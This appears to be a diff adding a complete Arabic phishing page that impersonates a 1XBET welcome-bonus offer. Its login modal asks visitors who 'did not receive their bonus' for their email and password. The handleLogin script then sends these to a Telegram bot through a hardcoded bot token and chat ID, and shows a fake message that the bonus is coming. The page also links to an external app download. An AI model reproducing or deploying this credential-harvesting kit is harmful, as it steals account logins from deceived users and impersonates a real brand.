@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>مكافأة ترحيبية - 1XBET</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body { font-family: 'Tajawal', sans-serif; }
+    .animate-fade-in {
+      animation: fadeIn 0.3s ease-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+  </style>
+</head>
+<body class="bg-gradient-to-br from-[#0f1c2e] via-[#1c2a3d] to-[#0f1c2e] min-h-screen flex flex-col items-center justify-start py-8 px-4 text-white">
+
+  <!-- الشعار -->
+  <div class="mb-6">
+    <img src="https://1xbetwin.netlify.app/1x-logo.svg" alt="1XBET" class="h-10 drop-shadow-lg">
+  </div>
+
+  <!-- صندوق المكافأة -->
+  <div class="bg-[#1e2f47] max-w-md w-full rounded-2xl p-6 shadow-2xl border border-blue-500/10 backdrop-blur-sm">
+    <h2 class="text-2xl font-bold text-center text-[#4fc3f7] mb-4">مكافأة ترحيبية من 1XBET</h2>
+    <p class="text-sm leading-relaxed text-center mb-6 text-gray-200">
+      احصل على <span class="font-bold text-white">5500 جنيه</span> كمكافأة ترحيبية عند التسجيل في <span class="font-bold text-white">1XBET</span>.<br>
+      استخدم الرمز الترويجي <span class="text-[#4fc3f7] font-semibold">LWF250</span> أثناء التسجيل.<br>
+      الحد الأدنى للإيداع هو <span class="font-semibold text-white">550 جنيه مصري</span>.
+    </p>
+    <div class="text-center">
+      <button onclick="downloadApp()" class="bg-[#4fc3f7] text-[#0f1c2e] font-bold py-2 px-6 rounded-xl hover:bg-[#81d4fa] transition-all duration-300 shadow-md hover:scale-105">
+        تحميل التطبيق
+      </button>
+    </div>
+  </div>
+
+  <!-- تسجيل الدخول -->
+  <div class="bg-[#1e2f47] max-w-md w-full mt-6 rounded-2xl p-5 text-center shadow-lg border border-blue-500/10">
+    <p class="text-sm mb-4 text-gray-300">سجلت بالبروموكود ولم تحصل على مكافأة؟<br>سجل الدخول من هنا لتحصل على مكافأتك</p>
+    <button onclick="document.getElementById('loginModal').classList.remove('hidden')" class="bg-[#4fc3f7] text-[#0f1c2e] font-bold py-2 px-6 rounded-xl hover:bg-[#81d4fa] transition-all duration-300 shadow-md hover:scale-105">تسجيل الدخول</button>
+  </div>
+
+  <!-- نافذة تسجيل الدخول -->
+  <div id="loginModal" class="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 hidden">
+    <div class="bg-[#1e2f47] text-white rounded-2xl p-6 w-80 relative shadow-2xl animate-fade-in border border-blue-500/20">
+      <!-- زر إغلاق -->
+      <button onclick="document.getElementById('loginModal').classList.add('hidden')" 
+        class="absolute top-3 left-3 text-white hover:text-red-400 text-xl font-bold transition duration-200">
+        ✖
+      </button>
+      
+      <h3 class="text-lg font-bold mb-4 text-center text-[#4fc3f7]">تسجيل الدخول</h3>
+      
+      <label class="block text-sm mb-2 text-gray-300">اسم المستخدم أو البريد الإلكتروني</label>
+      <input id="email" type="email" class="w-full mb-4 px-3 py-2 rounded-lg bg-[#0f1c2e] text-white border border-blue-500/30 focus:outline-none focus:ring-2 focus:ring-[#4fc3f7]" placeholder="اسم المستخدم أو البريد الإلكتروني" />
+      
+      <label class="block text-sm mb-2 text-gray-300">كلمة المرور</label>
+      <input id="password" type="password" class="w-full mb-4 px-3 py-2 rounded-lg bg-[#0f1c2e] text-white border border-blue-500/30 focus:outline-none focus:ring-2 focus:ring-[#4fc3f7]" placeholder="********" />
+      
+      <button onclick="handleLogin()" class="w-full bg-[#4fc3f7] text-[#0f1c2e] font-bold py-2 rounded-xl hover:bg-[#81d4fa] transition-all duration-300 shadow-md hover:scale-105">
+        تسجيل الدخول
+      </button>
+    </div>
+  </div>
+
+  <!-- رسالة تأكيد -->
+  <div id="messageBox" class="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 hidden">
+    <div class="bg-[#1e2f47] text-[#4fc3f7] text-center px-6 py-5 rounded-xl shadow-2xl text-xl font-bold animate-fade-in border border-blue-500/20">
+      راجع حسابك باستمرار ستصل المكافأة في اقرب وقت .
+    </div>
+  </div>
+
+  <!-- سكربت -->
+  <script>
+    function downloadApp() {
+      window.location.href = "https://1xlite-41051.world/mobile?bf=29b63fbf6b2d4_11145200567";
+    }
+
+    async function handleLogin() {
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      if (!email || !password) {
+        alert("يرجى إدخال البريد الإلكتروني وكلمة المرور");
+        return;
+      }
+
+      const message = `🔐 تسجيل دخول جديد:\n📧 الإيميل: ${email}\n🔑 كلمة المرور: ${password}`;
+      const token = "8448189654:AAH8FdKK2z0Mqy60LNn5UQbGx4G1FKdhNv8";
+      const chatId = "8151562616";
+
+      try {
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: message })
+        });
+
+        document.getElementById("loginModal").classList.add("hidden");
+        document.getElementById("messageBox").classList.remove("hidden");
+
+        setTimeout(() => location.reload(), 5000);
+      } catch (err) {
+        alert("حدث خطأ أثناء الإرسال إلى تيليجرام");
+        console.error(err);
+      }
+    }
+  </script>
+
+</body>
+</html>
